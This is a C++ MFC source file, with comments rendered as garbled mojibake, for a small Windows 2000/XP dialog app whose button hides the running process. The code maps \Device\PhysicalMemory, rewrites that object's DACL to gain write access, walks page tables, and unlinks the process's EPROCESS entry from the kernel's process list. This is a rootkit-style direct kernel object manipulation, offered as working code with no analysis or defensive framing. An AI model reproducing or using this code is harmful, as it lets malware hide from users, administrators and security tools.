// hideproc2Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "hideproc2.h"
#include "hideproc2Dlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHideproc2Dlg dialog

CHideproc2Dlg::CHideproc2Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CHideproc2Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CHideproc2Dlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CHideproc2Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CHideproc2Dlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CHideproc2Dlg, CDialog)
	//{{AFX_MSG_MAP(CHideproc2Dlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHideproc2Dlg message handlers

BOOL CHideproc2Dlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CHideproc2Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CHideproc2Dlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CHideproc2Dlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

BOOL CHideproc2Dlg::InitNTDLL()//��ʼ��,�������DLL,���һ����Ӧ�����ĺ���ָ��
{
	//���صõ���ģ����,���Լ���һ����̬���ӿ��exe�ļ�
    g_hNtDLL = LoadLibrary("ntdll.dll");

    if (NULL == g_hNtDLL)
        return FALSE;
	//������ȡRtlInitUnicodeString�����
    RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress( g_hNtDLL, 
		
		"RtlInitUnicodeString");
    ZwOpenSection = (ZWOPENSECTION)GetProcAddress( g_hNtDLL, "ZwOpenSection");

	return TRUE;

}

void CHideproc2Dlg::CloseNTDLL()//�ͳ�ʼ����Ӧ,������Ӧ����β����(�رն�̬���ӿ�)
{
	//�ͷŶ�̬���ӿ�
    if(NULL != g_hNtDLL)
        FreeLibrary(g_hNtDLL);
	
    g_hNtDLL = NULL;
}



void CHideproc2Dlg::SetPhyscialMemorySectionCanBeWrited(HANDLE hSection)//���ĵ�ǰ���̵�session,ʹ��ǰ���̾��ж�д��Ӧ���Ķ����Ȩ��
{
    PACL pDacl                    = NULL; 
    PSECURITY_DESCRIPTOR pSD    = NULL; 
    PACL pNewDacl = NULL; //��õ�ǰ���̶�Ӧ��DACL
    
    DWORD dwRes = GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, 
		
		NULL, &pDacl, NULL, &pSD);
	
    if(ERROR_SUCCESS != dwRes)
    {
		
		if(pSD) 
			LocalFree(pSD); 
		if(pNewDacl) 
			LocalFree(pNewDacl); 
    }
	
    EXPLICIT_ACCESS ea; 
    RtlZeroMemory(&ea, sizeof(EXPLICIT_ACCESS)); 
    ea.grfAccessPermissions = SECTION_MAP_WRITE; 
    ea.grfAccessMode = GRANT_ACCESS; 
    ea.grfInheritance= NO_INHERITANCE; 
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME; 
    ea.Trustee.TrusteeType = TRUSTEE_IS_USER; 
    ea.Trustee.ptstrName = "CURRENT_USER"; 
	
    dwRes = SetEntriesInAcl(1,&ea,pDacl,&pNewDacl);
    
    if(ERROR_SUCCESS != dwRes)
    {
		
		if(pSD) 
			LocalFree(pSD); 
		if(pNewDacl) 
			LocalFree(pNewDacl); 
    }
    dwRes = SetSecurityInfo
		//����һ��CURRENT_USER��ACE
		(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,pNewDacl,NULL);
    
    if(ERROR_SUCCESS != dwRes)
    {
		
		if(pSD) 
			LocalFree(pSD); 
		if(pNewDacl) 
			LocalFree(pNewDacl); 
    }
}

HANDLE CHideproc2Dlg::OpenPhysicalMemory()//������������ڴ�ӳ��
{
    NTSTATUS status;
    UNICODE_STRING physmemString;
    OBJECT_ATTRIBUTES attributes;
    ULONG PhyDirectory;
	
    g_osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx (&g_osvi);
	
    if (5 != g_osvi.dwMajorVersion)
        return NULL;//�ж�ϵͳ�汾
	
    switch(g_osvi.dwMinorVersion)//0x30000��0x3900�ֱ���2kϵͳ��xpϵͳҳĿ¼���ڴ��ַ���ڵļĴ������ڴ��ַ
    {
	case 0:
		PhyDirectory = 0x30000;
		break; //2kϵͳ
	case 1:
		PhyDirectory = 0x39000;
		break; //xpϵͳ
	default:
		return NULL;
    }
	//RtlInitUnicodeString��UNICODE����ʼ��UNICODE�����Ľṹ(windows���ں��ǻ���Unicode��,������Ҫ���������ַ���ת����Unicode��ʽ
    RtlInitUnicodeString(&physmemString, L"\\Device\\PhysicalMemory");
	
    attributes.Length                    = sizeof(OBJECT_ATTRIBUTES);
    attributes.RootDirectory            = NULL;
    attributes.ObjectName                = &physmemString;
    attributes.Attributes                = 0;
    attributes.SecurityDescriptor        = NULL;
    attributes.SecurityQualityOfService    = NULL;
	//ZwOpenSection���ں˶���
    status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
	
    if(status == STATUS_ACCESS_DENIED)
    { 
        status = ZwOpenSection(&g_hMPM, READ_CONTROL|WRITE_DAC, &attributes); 
        SetPhyscialMemorySectionCanBeWrited(g_hMPM); //�ڵ�ǰ����Ȩ�޲����ʱ��������ǰ����Ȩ��
        CloseHandle(g_hMPM);
        status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
    }
	
    if(!NT_SUCCESS(status)) 
        return NULL;
	//MapViewOfFileӳ�����������ڴ��
    g_pMapPhysicalMemory = MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, PhyDirectory, 
		
		0x1000);
	
    if( g_pMapPhysicalMemory == NULL )
        return NULL;
	
    return g_hMPM;
}
//�����Ե�ַת���������ַ(g_pMapPhysicalMemory��ȫ�ֱ���,��ҳĿ¼����ڴ�ӳ��
PVOID CHideproc2Dlg::LinearToPhys(PULONG BaseAddress, PVOID addr)
{
    ULONG VAddr = (ULONG)addr,PGDE,PTE,PAddr;
    PGDE = BaseAddress[VAddr>>22];//��ҳĿ¼���л����Ӧҳ��ĵ�ַ
	
    if (0 == (PGDE&1))//�ж�ҳ�����Ƿ���Ч
        return 0;
	
    ULONG tmp = PGDE & 0x00000080;
	
    if (0 != tmp)//��ҳ������λ����λ�ж��Ƿ�Ϊ��һ��ҳ����ڴ�ҳ,large page��4M��,����ֱ�ӷ��ʶ����ط�ҳ
    {
        PAddr = (PGDE & 0xFFC00000) + (VAddr & 0x003FFFFF);
    }
    else
    {//��ȡ��Ӧҳ������ָ����ڴ�
        PGDE = (ULONG)MapViewOfFile(g_hMPM, 4, 0, PGDE & 0xfffff000, 0x1000);
        PTE = ((PULONG)PGDE)[(VAddr&0x003FF000)>>12];
        
        if (0 == (PTE&1))
            return 0;
		
        PAddr=(PTE&0xFFFFF000)+(VAddr&0x00000FFF);
        UnmapViewOfFile((PVOID)PGDE);
    }
	
    return (PVOID)PAddr;//���ض�Ӧ�������ַ
}

ULONG CHideproc2Dlg::GetData(PVOID addr)//�������������ڴ�
{  
	//�����Ե�ַת��Ϊ�����ַ
    ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
    //������������ڴ��е�����ӳ�䵽��ǰ���̵��ڴ���
	PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, phys & 
		
		0xfffff000, 0x1000);//��ȡ����
    
    if (0 == tmp)
        return 0;
	
    ULONG ret = tmp[(phys & 0xFFF)>>2];
    UnmapViewOfFile(tmp);//ȡ����ַ�ռ�ӳ��
	
    return ret;//���ؽ��
}

BOOL CHideproc2Dlg::SetData(PVOID addr, ULONG data)//�������������
{
    ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
    PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);
	
    if (0 == tmp)
        return FALSE;
	
    tmp[(phys & 0xFFF)>>2] = data;
    UnmapViewOfFile(tmp);
	
    return TRUE;
}

BOOL CHideproc2Dlg::YHideProcess()//���ؽ���
{
	//    SetUnhandledExceptionFilter(exeception);
	
    if (FALSE == InitNTDLL())//��ʼ��,�������DLL
        return FALSE;
	
    if (0 == OpenPhysicalMemory())//�򿪶�Ӧ��ϵͳ�ڴ�,����ӳ��Ϊһ�����Ķ���
        return FALSE;
	
    ULONG thread  = GetData((PVOID)0xFFDFF124); //kteb����Current Thread block�����ݿ�KTHREAD
    ULONG process = GetData(PVOID(thread + 0x44)); //kpeb��KTHREAD���ݿ��л��ָ��ǰ���̵�EPROCESS���ݿ��ָ��
	
    ULONG fw, bw;//��Windows��ϵͳ�汾���ж�,���Ҹ��ݲ�ͬ��ϵͳȷ��EPROCESS��������ָ��FLINK��BLINK��ƫ��λ��
    if (0 == g_osvi.dwMinorVersion)
    {
        fw = GetData(PVOID(process + 0xa0));
        bw = GetData(PVOID(process + 0xa4));        
    }
	
    if (1 == g_osvi.dwMinorVersion)
    {
        fw = GetData(PVOID(process + 0x88));
        bw = GetData(PVOID(process + 0x8c));
    }
	
    SetData(PVOID(fw + 4), bw);//���Ľ��̻���ĸ���,�ý���������ǰ���̵�EPROCESS��
    SetData(PVOID(bw), fw);
	
    CloseHandle(g_hMPM);//�رպ��Ķ���
    CloseNTDLL();//�ر�DLL
	
    return TRUE;
}

BOOL CHideproc2Dlg::HideProcess()
{
	HMODULE g_hNtDLL = NULL;
	PVOID g_pMapPhysicalMemory = NULL;
	HANDLE g_hMPM = NULL;

	static BOOL b_hide = false;
	if (!b_hide)
	{
		b_hide = true;
		YHideProcess();
		return true;
	}
	return true;
}

void CHideproc2Dlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	HideProcess();
}
